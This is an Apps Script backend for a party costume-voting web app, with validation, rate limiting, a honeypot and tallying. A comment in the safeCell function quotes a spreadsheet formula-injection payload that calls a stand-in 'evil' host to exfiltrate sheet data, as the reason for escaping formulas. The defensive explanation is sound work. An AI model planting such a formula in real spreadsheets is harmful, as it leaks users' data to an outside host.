/**
 * Haunted Hollywood — costume ballot box.
 *
 * Lives inside the "Costume Votes" spreadsheet (Extensions > Apps Script), so it
 * already has permission to write to it. No API keys, nothing stored in the site.
 *
 * The web app URL is compiled into the public site and the deployment is open
 * to "Anyone", so treat every request as hostile. Defences, in order:
 *   1. Honeypot field  - silently discarded, logged, bot is told "ok".
 *   2. Voting toggle   - nothing is accepted while Settings says voting is closed.
 *   3. Rate limit      - RATE_LIMIT_MAX per window, script-wide.
 *   4. Validation      - strict shapes, not silent coercion.
 *   5. Formula-safety  - user text can never become a live spreadsheet formula.
 *
 * One ballot per phone: every vote is keyed on (device, category), and a phone
 * voting again in a category replaces its earlier vote rather than adding one.
 * A vote cast under a voter name that already voted in that category from a
 * different phone also replaces the old one, which catches the easy dodge of
 * re-voting from a private tab under the same name.
 *
 * Sheet tabs (created on first use):
 *   Votes     Timestamp | Device | Voter | Category | Nominee | Costume
 *   Settings  Setting | Value          ("Voting open" checkbox, "Host key")
 *   Merges    Alias | Canonical        (host-maintained spelling fixes)
 *   Tally     written by Costume Votes > Refresh tally
 *   Log       Timestamp | Device | Voter | Category | Result | Detail
 *
 * FIRST TIME ONLY: run `setup` once from the editor, then Deploy > New
 * deployment > Web app, Execute as Me, Access Anyone.
 *
 * EVERY TIME AFTER: Deploy > Manage deployments > pencil > Version: New version
 * > Deploy. This keeps the SAME /exec URL the QR code points the site at.
 */

/** Must match src/lib/categories.ts. Add a category in both places. */
const CATEGORIES = {
  'best-dressed': 'Best Dressed',
  couples: 'Best Couples Costume',
  scariest: 'Scariest Costume',
}

const VOTES_SHEET = 'Votes'
const SETTINGS_SHEET = 'Settings'
const MERGES_SHEET = 'Merges'
const TALLY_SHEET = 'Tally'
const LOG_SHEET = 'Log'

const VOTES_HEADER = ['Timestamp', 'Device', 'Voter', 'Category', 'Nominee', 'Costume']
const LOG_HEADER = ['Timestamp', 'Device', 'Voter', 'Category', 'Result', 'Detail']

const SETTING_OPEN = 'Voting open'
const SETTING_HOST_KEY = 'Host key'

/** 55 guests, three categories, plenty of changed minds: 150 ballots / 10 min. */
const RATE_LIMIT_MAX = 150
const RATE_LIMIT_WINDOW_MS = 10 * 60 * 1000

/** Hard ceiling. One row per phone per category; 55 guests need ~165. */
const MAX_VOTE_ROWS = 1000

const NAME_MAX = 80
const COSTUME_MAX = 120

/** Autocomplete is read on every page load; spare the sheet. */
const NOMINEES_CACHE_KEY = 'nominees'
const NOMINEES_CACHE_SECONDS = 20

// --- Spreadsheet menu --------------------------------------------------------

function onOpen() {
  SpreadsheetApp.getUi()
    .createMenu('Costume Votes')
    .addItem('Refresh tally', 'refreshTally')
    .addItem('Set up tabs', 'setup')
    .addToUi()
}

/** Creates every tab, the open/closed checkbox and a host key. Safe to rerun. */
function setup() {
  ensureSheet(VOTES_SHEET, VOTES_HEADER)
  ensureSheet(LOG_SHEET, LOG_HEADER)
  ensureSheet(MERGES_SHEET, ['Alias', 'Canonical'])
  const settings = ensureSheet(SETTINGS_SHEET, ['Setting', 'Value'])
  if (findSettingRow(settings, SETTING_OPEN) === 0) {
    settings.appendRow([SETTING_OPEN, true])
    settings.getRange(settings.getLastRow(), 2).insertCheckboxes().setValue(true)
  }
  if (findSettingRow(settings, SETTING_HOST_KEY) === 0) {
    settings.appendRow([SETTING_HOST_KEY, Utilities.getUuid().replace(/-/g, '').slice(0, 16)])
  }
}

// --- HTTP -------------------------------------------------------------------

/**
 *   ?action=status                 { ok, open, nominees }
 *   ?action=results&key=<host key> { ok, open, totalBallots, categories }
 */
function doGet(e) {
  const params = (e && e.parameter) || {}
  try {
    if (params.action === 'results') {
      const key = String(params.key || '')
      const expected = String(getSetting(SETTING_HOST_KEY) || '')
      if (!expected || key !== expected) return json({ ok: false, error: 'Not for you.' })
      return json({ ok: true, open: votingOpen(), ...computeResults() })
    }
    return json({ ok: true, open: votingOpen(), nominees: cachedNominees() })
  } catch (err) {
    safeLog('', '', '', 'error', 'GET ' + String(err))
    return json({ ok: false, error: 'The ballot box could not be read.' })
  }
}

function doPost(e) {
  let data
  try {
    data = JSON.parse(e.postData.contents)
  } catch (err) {
    return json({ ok: false, error: 'Malformed request.' })
  }
  if (!data || typeof data !== 'object') {
    return json({ ok: false, error: 'Malformed request.' })
  }

  const lock = LockService.getScriptLock()
  try {
    lock.waitLock(20000)
  } catch (err) {
    return json({ ok: false, error: 'The ballot box is busy. Please try again.' })
  }

  try {
    return handleBallot(data)
  } catch (err) {
    safeLog('', '', '', 'error', String(err))
    return json({ ok: false, error: 'That ballot could not be recorded.' })
  } finally {
    lock.releaseLock()
  }
}

function handleBallot(data) {
  // 1. Honeypot. Real browsers leave this empty; scripted submitters fill it.
  if (String(data.website || '').trim() !== '') {
    safeLog(data.device, data.voter, '', 'honeypot', 'hidden field was filled')
    return json({ ok: true })
  }

  // 2. Closed is closed, whatever the phone thinks.
  if (!votingOpen()) {
    return json({ ok: false, closed: true, error: 'The ballot box is sealed. Voting has closed.' })
  }

  // 3. Rate limit before touching the spreadsheet at all.
  if (!underRateLimit()) {
    noteRateLimitOnce()
    return json({ ok: false, error: 'Too many ballots just now. Please try again shortly.' })
  }

  // 4. Validate shape strictly rather than coercing whatever turns up.
  const device = String(data.device || '').trim()
  if (!/^[A-Za-z0-9][A-Za-z0-9-]{15,63}$/.test(device)) {
    safeLog(device, data.voter, '', 'rejected', 'malformed device id')
    return json({ ok: false, error: 'This phone could not be identified. Reload and try again.' })
  }

  const voter = cleanText(data.voter)
  if (voter.length < 1 || voter.length > NAME_MAX) {
    safeLog(device, voter, '', 'rejected', 'voter name length ' + voter.length)
    return json({ ok: false, error: 'Please give your name (up to ' + NAME_MAX + ' characters).' })
  }

  // `votes` casts; `withdraw` lists categories this phone voted in before and
  // has now cleared. Either may be empty, but not both.
  const rawVotes = data.votes == null ? [] : data.votes
  const rawWithdraw = data.withdraw == null ? [] : data.withdraw
  if (!Array.isArray(rawVotes) || !Array.isArray(rawWithdraw)) {
    safeLog(device, voter, '', 'rejected', 'votes or withdraw not a list')
    return json({ ok: false, error: 'That ballot could not be read.' })
  }
  if (rawVotes.length + rawWithdraw.length < 1) {
    safeLog(device, voter, '', 'rejected', 'no votes')
    return json({ ok: false, error: 'Fill in at least one category.' })
  }
  if (rawVotes.length + rawWithdraw.length > Object.keys(CATEGORIES).length) {
    safeLog(device, voter, '', 'rejected', 'too many entries: ' + (rawVotes.length + rawWithdraw.length))
    return json({ ok: false, error: 'That ballot could not be read.' })
  }

  const votes = []
  const seen = {}
  for (let i = 0; i < rawVotes.length; i++) {
    const v = rawVotes[i] || {}
    const category = String(v.category || '')
    if (!Object.prototype.hasOwnProperty.call(CATEGORIES, category) || seen[category]) {
      safeLog(device, voter, category, 'rejected', 'bad or repeated category')
      return json({ ok: false, error: 'That ballot could not be read.' })
    }
    seen[category] = true
    const nominee = cleanText(v.nominee)
    const costume = cleanText(v.costume)
    if (nominee.length < 1 || nominee.length > NAME_MAX) {
      safeLog(device, voter, category, 'rejected', 'nominee length ' + nominee.length)
      return json({
        ok: false,
        error: 'Who gets your vote for ' + CATEGORIES[category] + '? Names are up to ' + NAME_MAX + ' characters.',
      })
    }
    if (costume.length > COSTUME_MAX) {
      safeLog(device, voter, category, 'rejected', 'costume length ' + costume.length)
      return json({ ok: false, error: 'Keep costume descriptions under ' + COSTUME_MAX + ' characters.' })
    }
    votes.push({ category: category, nominee: nominee, costume: costume })
  }

  const withdraw = []
  for (let i = 0; i < rawWithdraw.length; i++) {
    const category = String(rawWithdraw[i] || '')
    if (!Object.prototype.hasOwnProperty.call(CATEGORIES, category) || seen[category]) {
      safeLog(device, voter, category, 'rejected', 'bad or repeated withdrawal')
      return json({ ok: false, error: 'That ballot could not be read.' })
    }
    seen[category] = true
    withdraw.push(category)
  }

  const sheet = ensureSheet(VOTES_SHEET, VOTES_HEADER)
  if (sheet.getLastRow() > MAX_VOTE_ROWS) {
    safeLog(device, voter, '', 'rejected', 'row ceiling reached')
    return json({ ok: false, error: 'The ballot box is full. Please find Ben & Andi.' })
  }

  // 5. Upsert: one row per phone per category, and one per voter name.
  const rows = sheet.getLastRow() < 2 ? [] : sheet.getRange(2, 1, sheet.getLastRow() - 1, 6).getValues()
  const voterKey = normalizeName(voter)
  const now = new Date()
  const BLANK = ['', '', '', '', '', '']
  const isMine = function (row, category) {
    if (String(row[3]) !== category) return false
    return String(row[1]) === device || normalizeName(unsafeCell(row[2])) === voterKey
  }

  withdraw.forEach(function (category) {
    for (let i = 0; i < rows.length; i++) {
      if (!isMine(rows[i], category)) continue
      sheet.getRange(i + 2, 1, 1, 6).setValues([BLANK])
      rows[i] = BLANK.slice()
      safeLog(device, voter, category, 'withdrawn', 'row ' + (i + 2))
    }
  })

  votes.forEach(function (v) {
    const values = [now, device, safeCell(voter), v.category, safeCell(v.nominee), safeCell(v.costume)]
    let target = 0
    for (let i = 0; i < rows.length; i++) {
      if (!isMine(rows[i], v.category)) continue
      if (target === 0) {
        target = i + 2
      } else {
        // A second earlier row matched too (old phone + old name). Blank it
        // so the ballot counts once; the tally skips empty categories.
        sheet.getRange(i + 2, 1, 1, 6).setValues([BLANK])
        rows[i] = BLANK.slice()
      }
    }
    if (target > 0) {
      sheet.getRange(target, 1, 1, 6).setValues([values])
      rows[target - 2] = values
      safeLog(device, voter, v.category, 'updated', 'row ' + target + ': ' + v.nominee)
    } else {
      sheet.appendRow(values)
      rows.push(values)
      safeLog(device, voter, v.category, 'accepted', v.nominee)
    }
  })

  CacheService.getScriptCache().remove(NOMINEES_CACHE_KEY)
  return json({ ok: true })
}

// --- Tallying ---------------------------------------------------------------

/**
 * "Sarah  O'Neil", "sarah oneil" and "Sarah O’Neil" are one person. Couples
 * are order-free, so "Andi & Ben" and "ben and andi" are one couple.
 */
function normalizeName(value) {
  const base = String(value == null ? '' : value)
    .normalize('NFKD')
    .replace(/[̀-ͯ]/g, '')
    .toLowerCase()
    .replace(/\s+(and|n)\s+|\s*[&+\/]\s*/g, ' & ')
    .replace(/[^a-z0-9& ]/g, '')
    .replace(/\s+/g, ' ')
    .trim()
  if (base.indexOf('&') === -1) return base
  return base
    .split('&')
    .map(function (part) {
      return part.trim()
    })
    .filter(Boolean)
    .sort()
    .join(' & ')
}

/** Alias → canonical display name, keyed by normalized alias. */
function readMerges() {
  const sheet = SpreadsheetApp.getActive().getSheetByName(MERGES_SHEET)
  const merges = {}
  if (!sheet || sheet.getLastRow() < 2) return merges
  sheet
    .getRange(2, 1, sheet.getLastRow() - 1, 2)
    .getValues()
    .forEach(function (row) {
      const alias = normalizeName(unsafeCell(row[0]))
      const canonical = cleanText(unsafeCell(row[1]))
      if (alias && canonical) merges[alias] = canonical
    })
  return merges
}

function readVotes() {
  const sheet = SpreadsheetApp.getActive().getSheetByName(VOTES_SHEET)
  if (!sheet || sheet.getLastRow() < 2) return []
  return sheet
    .getRange(2, 1, sheet.getLastRow() - 1, 6)
    .getValues()
    .filter(function (row) {
      return Object.prototype.hasOwnProperty.call(CATEGORIES, String(row[3]))
    })
    .map(function (row) {
      return {
        voter: unsafeCell(row[2]),
        category: String(row[3]),
        nominee: unsafeCell(row[4]),
        costume: unsafeCell(row[5]),
      }
    })
}

/**
 * Groups every vote by nominee identity: merged canonical name if the host
 * mapped one, else the normalized spelling. Display name and costume are the
 * most common spelling actually typed (ties go to whoever was typed first).
 */
function groupVotes(votes, merges) {
  const groups = {}
  votes.forEach(function (v) {
    const norm = normalizeName(v.nominee)
    if (!norm) return
    const canonical = merges[norm]
    const id = canonical ? normalizeName(canonical) : norm
    const key = v.category + '|' + id
    if (!groups[key]) {
      groups[key] = { category: v.category, id: id, canonical: canonical || '', votes: 0, spellings: {}, costumes: {} }
    }
    const g = groups[key]
    g.votes++
    if (canonical) g.canonical = canonical
    bump(g.spellings, v.nominee)
    if (v.costume) bump(g.costumes, v.costume)
  })
  return Object.keys(groups).map(function (k) {
    const g = groups[k]
    return {
      category: g.category,
      id: g.id,
      name: g.canonical || mostCommon(g.spellings),
      costume: mostCommon(g.costumes),
      votes: g.votes,
    }
  })
}

function bump(counts, text) {
  const t = String(text).trim()
  counts[t] = (counts[t] || 0) + 1
}

function mostCommon(counts) {
  let best = ''
  let bestCount = 0
  Object.keys(counts).forEach(function (k) {
    if (counts[k] > bestCount) {
      best = k
      bestCount = counts[k]
    }
  })
  return best
}

/** Standard competition ranking, so ties share a place: 1, 1, 3. */
function computeResults() {
  const votes = readVotes()
  const groups = groupVotes(votes, readMerges())
  const voters = {}
  votes.forEach(function (v) {
    voters[normalizeName(v.voter)] = true
  })
  const categories = Object.keys(CATEGORIES).map(function (id) {
    const entries = groups
      .filter(function (g) {
        return g.category === id
      })
      .sort(function (a, b) {
        return b.votes - a.votes || a.name.localeCompare(b.name)
      })
    let rank = 0
    const ranked = entries.map(function (g, i) {
      if (i === 0 || g.votes !== entries[i - 1].votes) rank = i + 1
      return { rank: rank, name: g.name, costume: g.costume, votes: g.votes }
    })
    return {
      id: id,
      title: CATEGORIES[id],
      totalVotes: entries.reduce(function (sum, g) {
        return sum + g.votes
      }, 0),
      entries: ranked,
    }
  })
  return { totalBallots: Object.keys(voters).length, categories: categories }
}

/**
 * Names for autocomplete. Never vote counts: guests must not see who is
 * winning. Sorted alphabetically so the order leaks nothing either.
 */
function nomineeList() {
  const groups = groupVotes(readVotes(), readMerges())
  const byKey = {}
  groups.forEach(function (g) {
    const kind = g.category === 'couples' ? 'couple' : 'person'
    const key = kind + '|' + g.id
    if (!byKey[key]) byKey[key] = { name: g.name, costume: g.costume, kind: kind, weight: 0 }
    // Prefer the costume from whichever category named this person most.
    if (g.votes > byKey[key].weight) {
      byKey[key].weight = g.votes
      byKey[key].name = g.name
      if (g.costume) byKey[key].costume = g.costume
    }
  })
  return Object.keys(byKey)
    .map(function (k) {
      return { name: byKey[k].name, costume: byKey[k].costume, kind: byKey[k].kind }
    })
    .sort(function (a, b) {
      return a.name.localeCompare(b.name)
    })
}

function cachedNominees() {
  const cache = CacheService.getScriptCache()
  const hit = cache.get(NOMINEES_CACHE_KEY)
  if (hit) return JSON.parse(hit)
  const list = nomineeList()
  cache.put(NOMINEES_CACHE_KEY, JSON.stringify(list), NOMINEES_CACHE_SECONDS)
  return list
}

/** Writes the standings into the Tally tab for reading on the night. */
function refreshTally() {
  const results = computeResults()
  const ss = SpreadsheetApp.getActive()
  let sheet = ss.getSheetByName(TALLY_SHEET)
  if (!sheet) sheet = ss.insertSheet(TALLY_SHEET)
  sheet.clear()
  const out = [['Refreshed ' + new Date().toLocaleString(), '', '', ''], ['Ballots from', results.totalBallots + ' guests', '', '']]
  results.categories.forEach(function (c) {
    out.push(['', '', '', ''])
    out.push([c.title, c.totalVotes + ' votes', '', ''])
    out.push(['Place', 'Nominee', 'Costume', 'Votes'])
    if (c.entries.length === 0) out.push(['', '(no votes yet)', '', ''])
    c.entries.forEach(function (e) {
      out.push([e.rank === 1 ? '1 ★' : e.rank, safeCell(e.name), safeCell(e.costume), e.votes])
    })
  })
  sheet.getRange(1, 1, out.length, 4).setValues(out)
}

// --- Plumbing ---------------------------------------------------------------

/** Strip control characters, which would otherwise corrupt the cell; collapse space. */
function cleanText(value) {
  return String(value == null ? '' : value)
    .replace(/[\u0000-\u001F\u007F]/g, '')
    .replace(/\s+/g, ' ')
    .trim()
}

/**
 * A leading =, +, - or @ makes Sheets treat the text as a live formula, so a
 * guest called `=IMAGE("https://evil/?"&A1)` could exfiltrate the sheet the
 * moment it is opened. Prefixing with an apostrophe forces literal text.
 */
function safeCell(value) {
  const s = String(value == null ? '' : value)
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s
}

/** Undo safeCell when reading back, so the apostrophe never reaches a guest. */
function unsafeCell(value) {
  const s = String(value == null ? '' : value)
  return /^'[=+\-@\t\r]/.test(s) ? s.slice(1) : s
}

function votingOpen() {
  const v = getSetting(SETTING_OPEN)
  // Unset means open: the host should not have to run setup for the box to work.
  if (v === null || v === '') return true
  return v === true || String(v).trim().toUpperCase() === 'TRUE'
}

function getSetting(name) {
  const sheet = SpreadsheetApp.getActive().getSheetByName(SETTINGS_SHEET)
  const row = sheet ? findSettingRow(sheet, name) : 0
  return row ? sheet.getRange(row, 2).getValue() : null
}

function findSettingRow(sheet, name) {
  if (sheet.getLastRow() < 2) return 0
  const values = sheet.getRange(2, 1, sheet.getLastRow() - 1, 1).getValues()
  for (let i = 0; i < values.length; i++) {
    if (String(values[i][0]).trim().toLowerCase() === name.toLowerCase()) return i + 2
  }
  return 0
}

function underRateLimit() {
  const cache = CacheService.getScriptCache()
  const key = 'rl:' + Math.floor(Date.now() / RATE_LIMIT_WINDOW_MS)
  const current = Number(cache.get(key) || 0)
  if (current >= RATE_LIMIT_MAX) return false
  cache.put(key, String(current + 1), Math.ceil(RATE_LIMIT_WINDOW_MS / 1000) + 60)
  return true
}

/** Log the flood once per window, so the log itself cannot be flooded. */
function noteRateLimitOnce() {
  const cache = CacheService.getScriptCache()
  const key = 'rlnoted:' + Math.floor(Date.now() / RATE_LIMIT_WINDOW_MS)
  if (cache.get(key)) return
  cache.put(key, '1', Math.ceil(RATE_LIMIT_WINDOW_MS / 1000) + 60)
  safeLog('', '', '', 'rate-limited', 'over ' + RATE_LIMIT_MAX + ' in ' +
    RATE_LIMIT_WINDOW_MS / 60000 + ' min; further hits this window not logged')
}

function ensureSheet(name, header) {
  const ss = SpreadsheetApp.getActive()
  let sheet = ss.getSheetByName(name)
  if (!sheet) {
    sheet = ss.insertSheet(name)
    sheet.appendRow(header)
    sheet.setFrozenRows(1)
  }
  return sheet
}

/** Never let a logging failure take down a good ballot. */
function safeLog(device, voter, category, result, detail) {
  try {
    const sheet = ensureSheet(LOG_SHEET, LOG_HEADER)
    sheet.appendRow([
      new Date(),
      safeCell(String(device == null ? '' : device).slice(0, 64)),
      safeCell(String(voter == null ? '' : voter).slice(0, 120)),
      safeCell(String(category == null ? '' : category).slice(0, 40)),
      result,
      safeCell(String(detail == null ? '' : detail).slice(0, 200)),
    ])
  } catch (err) {
    // Swallow - the ballot matters more than the audit trail.
  }
}

function json(payload) {
  return ContentService.createTextOutput(JSON.stringify(payload)).setMimeType(
    ContentService.MimeType.JSON,
  )
}
